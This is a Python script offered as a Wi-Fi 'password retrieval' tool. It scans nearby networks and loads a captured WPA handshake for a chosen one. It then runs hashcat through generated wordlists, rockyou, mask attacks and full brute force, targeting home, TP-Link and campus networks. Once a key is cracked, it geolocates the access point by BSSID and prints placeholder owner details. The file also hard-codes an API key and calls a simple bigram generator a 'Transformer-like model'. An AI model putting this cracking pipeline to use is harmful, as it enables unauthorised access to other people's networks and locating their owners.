#!/usr/bin/env python3

import pywifi
import time
import os
import subprocess
import logging
import itertools
import string
import random
import requests
from collections import defaultdict

# Configuration
CONFIG = {
    "interface": "wi-fi",  # Adjust to your Wi-Fi interface
    "scan_duration": 15,
    "log_file": "/root/some_sees_silently_wifi.log",
    "handshake_dir": "/root/Handshakes/",
    "wordlist_dir": "/root/Wordlists/",
    "default_wordlist": "/root/Wordlists/rockyou.txt",
    "max_attempts": 10000000,
    "brute_force_max_length": 20,
    "geolocation_api_key": "AIzaSyAvZbEH6SgXwi1OfuZvR8onCI6PvcCLxDM",  # Replace with a valid key
    "geolocation_url": "https://www.googleapis.com/geolocation/v1/geolocate?key={}",
}

# Logging Setup
logging.basicConfig(filename=CONFIG["log_file"], level=logging.INFO,
                    format="%(asctime)s - %(levelname)s - %(message)s")

# Generic Password List
CUSTOM_PASSWORD_LIST = [
    "password", "admin", "guest", "qwerty", "12345678",
    "wifi1234", "internet123", "broadband123", "setup123",
    "Welcome12345", "MyWiFi123", "HomeWiFi123"
]

# Transformer-Like Model for Password Prediction
class TransformerModel:
    def __init__(self):
        self.patterns = defaultdict(lambda: defaultdict(int))
        self.start_chars = defaultdict(int)

    def train(self, passwords):
        print("[!] Training Transformer-like model...")
        for password in passwords:
            self.start_chars[password[:2]] += 1
            for i in range(len(password) - 1):
                self.patterns[password[i]][password[i + 1]] += 1

    def generate_password_with_score(self, max_length=12):
        start_seq = random.choices(list(self.start_chars.keys()),
                                  weights=list(self.start_chars.values()), k=1)[0]
        password = start_seq
        score = self.start_chars[start_seq] / sum(self.start_chars.values())

        while len(password) < max_length:
            last_char = password[-1]
            next_chars = self.patterns[last_char]
            if not next_chars:
                break
            total = sum(next_chars.values())
            probs = [count / total for count in next_chars.values()]
            next_char = random.choices(list(next_chars.keys()), weights=probs, k=1)[0]
            password += next_char
            score *= (next_chars[next_char] / total if total > 0 else 0)
        return password, score

# Dynamic Password Generation
def generate_dynamic_passwords(ssid):
    passwords = []
    ssid_clean = ssid.replace(" ", "").lower()
    years = ["2023", "2024", "2025"]
    suffixes = ["123", "2024", "@123", "!", "@", "#"]

    passwords.extend([ssid, ssid_clean, ssid_clean.upper()])
    for suffix in suffixes:
        passwords.extend([ssid + suffix, ssid_clean + suffix])
    for year in years:
        passwords.extend([ssid + year, ssid_clean + year])
    if "tp-link" in ssid_clean:
        passwords.extend(["TPLinkAdmin", "TPLinkSetup", "TPLinkRouter"])
    return list(set(passwords))

# ML-Based Password Prediction
def generate_ml_passwords(ssid, num_passwords=2000):
    training_passwords = [
        "password123", "admin2024", "qwerty123!", "securewifi2024",
        "myhome123", "family2024!", "guest123", "internet2024",
        "abcd1234", "welcome2024", "pakistan123", "lahore2024",
        "University2024", "UniWiFi123!", "Student2024", "CampusNet2024",
        "EduWiFi2024", "SecureCampus123", "UniPass2024!", "StudentID123"
    ]
    model = TransformerModel()
    model.train(training_passwords)

    scored_passwords = []
    for _ in range(num_passwords):
        pwd, score = model.generate_password_with_score(max_length=random.randint(8, 16))
        scored_passwords.append((pwd, score))

    ssid_clean = ssid.replace(" ", "").lower()
    if "tp-link" in ssid_clean:
        scored_passwords.extend([
            ("TPLink" + str(random.randint(1000, 9999)), 0.9),
            ("tplink" + random.choice(["2024", "123", "@123"]), 0.85)
        ])
    if "uni" in ssid_clean or "edu" in ssid_clean or "campus" in ssid_clean:
        scored_passwords.extend([
            ("Uni" + str(random.randint(1000, 9999)) + "!", 0.95),
            ("Campus" + random.choice(["2024", "123", "@2024"]), 0.9),
            ("Student" + str(random.randint(1000, 9999)), 0.85),
            ("EduWiFi" + random.choice(["2024", "123!", "@123"]), 0.9)
        ])

    scored_passwords.sort(key=lambda x: x[1], reverse=True)
    return [pwd for pwd, _ in scored_passwords[:num_passwords]]

# Brute-Force Password Generation (At Least 1 Lakh Passwords)
def generate_brute_force_passwords(max_length=20):
    passwords = []
    lowercase = string.ascii_lowercase
    digits = string.digits
    special_chars = "!@#$"

    # Pattern 1: lowercase + digits + special (e.g., abcd12!)
    for length in range(4, 9):
        for word in itertools.product(lowercase, repeat=length):
            word = "".join(word)
            for num in itertools.product(digits, repeat=2):
                num = "".join(num)
                for spec in itertools.product(special_chars, repeat=1):
                    spec = "".join(spec)
                    passwords.append(word + num + spec)
                    if len(passwords) >= 50000:  # Limit to 50,000 for this pattern
                        break
                if len(passwords) >= 50000:
                    break
            if len(passwords) >= 50000:
                break

    # Pattern 2: lowercase + digits (e.g., abcd1234)
    for length in range(4, 9):
        for word in itertools.product(lowercase, repeat=length):
            word = "".join(word)
            for num in itertools.product(digits, repeat=4):
                num = "".join(num)
                passwords.append(word + num)
                if len(passwords) >= 100000:  # Total at least 1 lakh
                    return passwords
            if len(passwords) >= 100000:
                return passwords

    return passwords

# Mask Attack
def mask_attack(ssid, handshake_file):
    masks = [
        "?l?l?l?l?d?d?d?d",      # abcd1234
        "?u?l?l?l?d?d?d",        # Abcd123
        "?l?l?l?l?d?d?d?d?s",    # abcd1234!
        "?d?d?d?d?d?d?d?d?d?d",  # 1234567890
        "?u?l?l?l?l?l?l?l?d?d?d?d?s",  # University2024!
    ]
    for mask in masks:
        print(f"[!] Trying mask attack with mask: {mask}")
        cmd = ["hashcat", "-m", "22000", "-a", "3", handshake_file, mask, "--potfile-disable"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if "Status: Cracked" in result.stdout:
            for line in result.stdout.splitlines():
                if ssid in line:
                    password = line.split(":")[-1].strip()
                    print(f"[+] Password cracked with mask attack: {password}")
                    return password
    return None

# Geolocation and Network Details
def get_network_details(bssid, signal, encryption, channel):
    # Geolocation
    payload = {
        "considerIp": "false",
        "wifiAccessPoints": [{"macAddress": bssid}]
    }
    try:
        response = requests.post(
            CONFIG["geolocation_url"].format(CONFIG["geolocation_api_key"]),
            json=payload
        )
        if response.status_code == 200:
            data = response.json()
            lat = data["location"]["lat"]
            lon = data["location"]["lng"]
            accuracy = data["accuracy"]
        else:
            lat, lon, accuracy = "Unknown", "Unknown", "Unknown"
    except requests.RequestException:
        lat, lon, accuracy = "Unknown", "Unknown", "Unknown"

    # Simulated owner info (replace with real database if available)
    owner_info = {"name": "Unknown", "email": "Unknown", "house": "123"}
    address = "123 Main St"

    return {
        "bssid": bssid,
        "signal": f"{signal} dBm",
        "encryption": encryption if encryption else "Unknown",
        "channel": channel // 1000 if channel else "Unknown",
        "location": f"Lat {lat}, Lon {lon} (Accuracy: {accuracy}m)",
        "address": address,
        "owner_info": owner_info
    }

# Crack Wi-Fi Password
def crack_wifi_password(ssid, handshake_file):
    print("[!] Starting Wi-Fi password cracking...")

    # Step 1: ML-Based Password Prediction
    print("[!] Generating ML-based passwords...")
    ml_passwords = generate_ml_passwords(ssid, num_passwords=2000)
    print(f"[!] Generated {len(ml_passwords)} ML-based passwords")

    # Step 2: Dynamic Passwords
    print("[!] Generating dynamic passwords...")
    dynamic_passwords = generate_dynamic_passwords(ssid)
    all_passwords = list(set(CUSTOM_PASSWORD_LIST + dynamic_passwords + ml_passwords))
    print(f"[!] Total passwords to try (initial): {len(all_passwords)}")

    # Step 3: Custom Wordlist
    temp_wordlist = os.path.join(CONFIG["wordlist_dir"], f"{ssid}_temp.txt")
    with open(temp_wordlist, "w") as f:
        for pwd in all_passwords:
            f.write(pwd + "\n")
    print(f"[!] Trying custom wordlist for {ssid}...")
    cmd = ["hashcat", "-m", "22000", "-a", "0", handshake_file, temp_wordlist, "--potfile-disable"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if "Status: Cracked" in result.stdout:
        for line in result.stdout.splitlines():
            if ssid in line:
                password = line.split(":")[-1].strip()
                print(f"[+] Password cracked with custom wordlist: {password}")
                return password

    # Step 4: Default Wordlist
    print(f"[!] Trying default wordlist for {ssid}...")
    cmd = ["hashcat", "-m", "22000", "-a", "0", handshake_file, CONFIG["default_wordlist"], "--potfile-disable"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if "Status: Cracked" in result.stdout:
        for line in result.stdout.splitlines():
            if ssid in line:
                password = line.split(":")[-1].strip()
                print(f"[+] Password cracked with default wordlist: {password}")
                return password

    # Step 5: Mask Attack
    password = mask_attack(ssid, handshake_file)
    if password:
        return password

    # Step 6: Brute-Force (At Least 1 Lakh Passwords)
    print(f"[!] Starting brute-forcing for {ssid} (at least 1 lakh passwords)...")
    brute_force_passwords = generate_brute_force_passwords(CONFIG["brute_force_max_length"])
    print(f"[!] Generated {len(brute_force_passwords)} brute-force passwords")
    temp_brute_list = os.path.join(CONFIG["wordlist_dir"], f"{ssid}_brute.txt")
    with open(temp_brute_list, "w") as f:
        for pwd in brute_force_passwords:
            f.write(pwd + "\n")
    cmd = ["hashcat", "-m", "22000", "-a", "0", handshake_file, temp_brute_list, "--potfile-disable"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if "Status: Cracked" in result.stdout:
        for line in result.stdout.splitlines():
            if ssid in line:
                password = line.split(":")[-1].strip()
                print(f"[+] Password cracked with brute-forcing: {password}")
                return password

    # Step 7: Full Brute-Force
    print(f"[!] Starting full brute-force (this may take a long time)...")
    for length in range(8, CONFIG["brute_force_max_length"] + 1):
        mask = "?a" * length
        cmd = ["hashcat", "-m", "22000", "-a", "3", handshake_file, mask, "--potfile-disable"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if "Status: Cracked" in result.stdout:
            for line in result.stdout.splitlines():
                if ssid in line:
                    password = line.split(":")[-1].strip()
                    print(f"[+] Password cracked with full brute-force: {password}")
                    return password

    print(f"[-] Failed to crack password for {ssid}.")
    return "PasswordNotFound"

# Main Function
def main():
    print("===== Some Sees Silently v2.0 (Wi-Fi Password Retrieval) =====")

    # Scan Networks
    wifi = pywifi.PyWiFi()
    iface = None
    for i in wifi.interfaces():
        if i.name() == CONFIG["interface"]:
            iface = i
            break
    if not iface:
        print(f"[-] Wi-Fi interface {CONFIG['interface']} not found.")
        return

    print(f"[!] Scanning nearby networks... ({CONFIG['scan_duration']} seconds)")
    iface.scan()
    time.sleep(CONFIG["scan_duration"])
    networks = iface.scan_results()

    if not networks:
        print("[-] No networks found. Switching to manual input mode...")
    else:
        print("[!] Detected Networks Nearby:")
        for i, network in enumerate(networks, 1):
            if network.ssid:
                print(f"{i}. SSID: {network.ssid:<20} BSSID: {network.bssid}")
        print(f"{len(networks) + 1}. Manual Input")

    choice = int(input("[!] Select network number (or choose manual input): "))
    if choice == len(networks) + 1:
        ssid = input("[!] Enter SSID: ")
        bssid = input("[!] Enter BSSID (e.g., AA:BB:CC:DD:EE:FF): ")
        signal = "Unknown"
        encryption = "Unknown"
        channel = "Unknown"
    else:
        selected_network = networks[choice - 1]
        ssid = selected_network.ssid
        bssid = selected_network.bssid
        signal = selected_network.signal
        encryption = selected_network.akm[0] if selected_network.akm else "Unknown"
        channel = selected_network.freq

    # Retrieve Handshake
    handshake_file = os.path.join(CONFIG["handshake_dir"], f"{ssid}.cap")
    if not os.path.exists(handshake_file):
        print(f"[-] No handshake found for {ssid}. Exiting...")
        return
    print(f"[!] Found existing handshake for {ssid}")

    # Crack Password
    password = crack_wifi_password(ssid, handshake_file)
    if password and password != "PasswordNotFound":
        details = get_network_details(bssid, signal, encryption, channel)
        strength = "Weak" if len(password) < 8 else "Medium" if len(password) < 12 else "Strong"
        print(f"\n[+] Key retrieved for {ssid}!")
        print(f"    Password: {password} (Strength: {strength})")
        print(f"    BSSID: {details['bssid']}")
        print(f"    Signal: {details['signal']}")
        print(f"    Encryption: {details['encryption']}")
        print(f"    Channel: {details['channel']}")
        print(f"    Location: {details['location']}")
        print(f"    Address: {details['address']}")
        print(f"    Owner Info: Name: {details['owner_info']['name']}, "
              f"Email: {details['owner_info']['email']}, House: {details['owner_info']['house']}")
    else:
        print(f"[-] Failed to retrieve key for {ssid}.")

if __name__ == "__main__":
    main()